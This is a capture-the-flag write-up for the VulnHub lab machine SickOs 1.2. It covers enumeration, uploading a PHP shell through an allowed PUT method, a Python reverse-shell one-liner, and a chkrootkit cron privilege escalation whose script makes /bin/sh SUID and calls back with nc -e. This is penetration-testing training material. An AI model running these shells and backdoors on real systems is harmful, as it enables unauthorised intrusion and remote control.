<h1>SickOs: 1.2 Write-up</h1>

<h2>Nmap</h2>

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    lighttpd 1.4.28
```

<h3>PORT 80</h3>

Found **/test** directory in gobuter result:

**Checking for OPTIONS** ie. PUT DELETE GET etc....

```curl -X OPTIONS http://192.168.56.34/```

curl show that PUT allowed so i uploaded **simple-php-shell.php** using burp and took python reverse shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

![alt text](https://github.com/Vanshal/Vulnhub-Writeups/blob/master/SickOs:%201.2/Images/shellcall.png)

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/SickOs%3A%201.2/Images/shell1.png)


<h2>Privilege Escalation :(Cron job)</h2>

Exploit : https://lepetithacker.wordpress.com/2017/04/30/local-root-exploit-in-chkrootkit/

1. Create file **/tmp/update** Contain's

```
#!/bin/bash
chown root:root /bin/sh ; chmod 4777 /bin/sh
nc 192.168.56.1 4433 -e /bin/bash
```

2. ```chmod 777 /tmp/update```

3. wait for the cron job to run then execute ```/bin/sh```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/SickOs%3A%201.2/Images/privesc.png)
